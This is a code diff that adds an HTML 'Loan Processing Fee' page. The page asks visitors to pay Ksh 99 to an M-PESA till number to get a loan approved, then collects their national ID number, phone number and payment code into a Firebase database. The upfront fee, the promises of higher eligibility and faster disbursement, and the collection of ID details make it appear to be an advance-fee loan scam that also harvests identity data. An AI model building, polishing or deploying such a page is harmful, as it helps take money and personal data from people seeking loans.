@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Loan Processing Payment</title>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
+  <style>
+    body {
+      font-family: "Segoe UI", sans-serif;
+      background: #f4f6f9;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .payment-box {
+      background: #fff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 400px;
+    }
+    h2 {
+      text-align: center;
+      color: #2c3e50;
+    }
+    .info {
+      background: #fef5e7;
+      border-left: 4px solid #f39c12;
+      padding: 10px;
+      font-size: 14px;
+      margin-bottom: 15px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #2c3e50;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background: #1a252f;
+    }
+    #message {
+      text-align: center;
+      margin-top: 12px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-box">
+    <h2>Loan Processing Fee</h2>
+    <div class="info">
+      To process your loan application, you are required to pay a total fee of 
+      <b>Ksh 99</b> via <b>Till Number: 4585402</b>. <br><br>
+      ✅ Covers processing, CRB check, and data securing. <br>
+      ✅ Increases your loan eligibility. <br>
+      ✅ Fastens approval & disbursement time. 
+    </div>
+
+    <input type="text" id="idNumber" placeholder="National ID Number" required>
+    <input type="tel" id="phone" placeholder="Active Mobile Number (07...)" required>
+    <input type="text" id="mpesaCode" placeholder="M-PESA Confirmation Code" required>
+    <button onclick="submitPayment()">Submit Payment</button>
+    <p id="message"></p>
+  </div>
+
+  <script>
+    // Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDsRwHSbZUL9VkZiyx9gDRgblotaVAHHiQ",
+      authDomain: "sample-329e1.firebaseapp.com",
+      projectId: "sample-329e1",
+      storageBucket: "sample-329e1.appspot.com",
+      messagingSenderId: "880950005868",
+      appId: "1:880950005868:web:296a55912477a4b4a44849"
+    };
+
+    // Init Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    async function submitPayment() {
+      const idNumber = document.getElementById("idNumber").value.trim();
+      const phone = document.getElementById("phone").value.trim();
+      const mpesaCode = document.getElementById("mpesaCode").value.trim();
+      const msg = document.getElementById("message");
+
+      if (!idNumber || !phone || !mpesaCode) {
+        msg.style.color = "red";
+        msg.textContent = "⚠️ Please fill in all fields.";
+        return;
+      }
+
+      try {
+        // Save under users collection using phone number as doc ID
+        await db.collection("users").doc(phone).set({
+          idNumber,
+          phone,
+          mpesaCode,
+          amountPaid: 99,
+          tillNumber: "4585402",
+          loanStatus: "Pending",
+          messages: [
+            { text: "Your payment has been received. Awaiting admin review.", date: new Date().toLocaleString() }
+          ],
+          createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        }, { merge: true });
+
+        // Save phone in localStorage to use in Notification page
+        localStorage.setItem("userPhone", phone);
+
+        msg.style.color = "green";
+        msg.textContent = "✅ Payment submitted successfully. Redirecting...";
+
+        // Redirect to notifications page after 2 seconds
+        setTimeout(() => {
+          window.location.href = "notification.html";
+        }, 2000);
+
+      } catch (error) {
+        msg.style.color = "red";
+        msg.textContent = "❌ " + error.message;
+      }
+    }
+  </script>
+</body>
+</html>
